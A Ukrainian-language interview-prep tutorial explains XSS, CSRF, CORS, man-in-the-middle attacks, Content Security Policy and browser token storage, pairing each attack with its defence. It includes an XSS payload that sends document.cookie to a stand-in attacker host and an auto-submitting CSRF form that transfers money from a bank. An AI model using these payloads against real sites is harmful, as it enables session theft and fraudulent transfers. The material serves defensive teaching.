XSS, CSRF, CORS, Man-in-the-Middle

Чотири абревіатури, які на співбесіді майже завжди питають підряд — і майже завжди приймають відповідь-визначення. Різниця між "знає абревіатуру" й "розуміє механізм" видно в одному уточнювальному питанні: хто саме жертва й що конкретно в браузері чи мережі дозволяє атаці спрацювати.

XSS (Cross-Site Scripting) — зловмисний JavaScript виконується в браузері жертви в контексті довіреного сайту. Класичний приклад — stored XSS: застосунок зберігає коментар користувача як є і рендерить його як HTML замість тексту.

вразливо
// коментар від користувача: <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
element.innerHTML = comment.text; // браузер виконає onerror як звичайний JS

// безпечно — текст лишається текстом, HTML-теги не інтерпретуються
element.textContent = comment.text;

Жертва тут — будь-який інший користувач, що просто відкрив сторінку з цим коментарем; зловмисник ніколи не торкається їхнього браузера напряму, скрипт запускає сам браузер жертви. Головний захист — ніколи не вставляти сирий ввід користувача як HTML (textContent замість innerHTML, або санітизація/екранування, якщо HTML справді потрібен), плюс CSP як другий рубіж (розділ 2 нижче).

CSRF (Cross-Site Request Forgery) — зловмисний сайт змушує браузер жертви відправити запит на інший сайт, де жертва вже автентифікована, використовуючи те, що браузер автоматично додає cookie до запиту незалежно від того, звідки завантажена сторінка, яка цей запит ініціює.

evil.example/page.html
<!-- жертва залогінена на bank.example, cookie сесії вже в браузері -->
<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>
<!-- браузер автоматично додасть cookie сесії bank.example до цього POST -->

Жертва тут — сам користувач, чиєю сесією зловживають без його відома. Основний захист — CSRF-токен, унікальний для сесії/форми, якого зловмисний сайт не може прочитати й підставити, плюс cookie з атрибутом SameSite=Lax чи Strict, що не дає браузеру взагалі відправити cookie в такому крос-сайтовому запиті.

CORS (Cross-Origin Resource Sharing) — тут важливо розуміти, що CORS не атака й не серверний захист сам по собі, а браузерний механізм, який за замовчуванням забороняє JS-коду з одного origin читати відповідь запиту до іншого origin, якщо той інший origin явно не дозволив це заголовком Access-Control-Allow-Origin. Запит технічно все одно йде на сервер (сервер його може навіть виконати) — CORS лише блокує браузеру віддати JS-коду відповідь. Тому CORS захищає користувача читання чужих даних через браузер жертви, а не сервер від атаки як такої.

Man-in-the-Middle (MITM) — атака на рівні мережі, а не браузера: зловмисник перехоплює трафік між клієнтом і сервером (незахищений Wi-Fi, скомпрометований роутер, підроблений DNS) і може читати чи підміняти дані в польоті. Жертва — обидві сторони з'єднання. Захист — HTTPS/TLS: шифрування робить перехоплений трафік нечитабельним і виявляє підміну сертифіката.

Content Security Policy (CSP)

CSP — HTTP-заголовок відповіді (Content-Security-Policy), яким сервер каже браузеру: "виконуй скрипти й підвантажуй ресурси тільки з цих джерел, і ніяк інакше". Це другий рубіж захисту від XSS: навіть якщо десь у коді лишилась діра для ін'єкції, CSP може не дати впровадженому скрипту виконатись узагалі.

приклад заголовка
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.example.com;
  object-src 'none';

Тут script-src 'self' https://cdn.example.com означає: браузер виконає лише скрипти, завантажені з того самого origin або з довіреного CDN — інлайн-скрипт, впроваджений через XSS прямо в HTML (наприклад, <script>fetch(...)</script> всередині вкраденого коментаря), просто не виконається, навіть якщо він фізично потрапив у DOM. Це не закриває саму діру ін'єкції — воно суттєво звужує, що зловмисник може зробити, навіть якщо діра є.

⚠️
CSP — це захист у глибину (defense in depth), а не заміна правильної санітизації вводу. Директива 'unsafe-inline' у script-src (на відміну від style-src вище) звела б захист від XSS майже нанівець — саме тому інлайн-скрипти в сучасних CSP-налаштуваннях зазвичай заборонені за замовчуванням.

Безпечне зберігання токенів на практиці

Тема сховищ браузера (туторіал B) вже пояснює, чому localStorage ризикований для токенів. Тут — практичне рішення: як реально розподілити access/refresh токени між трьома доступними варіантами сховища.

Практична рекомендація, яку варто вміти обґрунтувати, а не просто назвати: довгоживучий refresh-токен — у httpOnly-cookie з SameSite=Lax (JS до нього взагалі не має доступу, тож XSS його вкрасти не може); короткоживучий access-токен (хвилини) — тримати лише в пам'яті застосунку (змінна модуля/стору, не персиститься), щоб навіть за успішної XSS-атаки зловмисник отримав токен з коротким вікном дії, а не безстрокову сесію. localStorage для будь-якого з двох токенів комбінує гірші сторони обох підходів — тому вважається антипатерном для SPA-автентифікації.

🎯
Що перевіряють насправді: чи розумієте ви компроміс, а не лише "правильну відповідь" — httpOnly-cookie сама по собі не панацея (вона відкриває поверхню для CSRF, яку закриває SameSite), тому безпека тут — комбінація двох механізмів, а не один "правильний" вибір сховища.
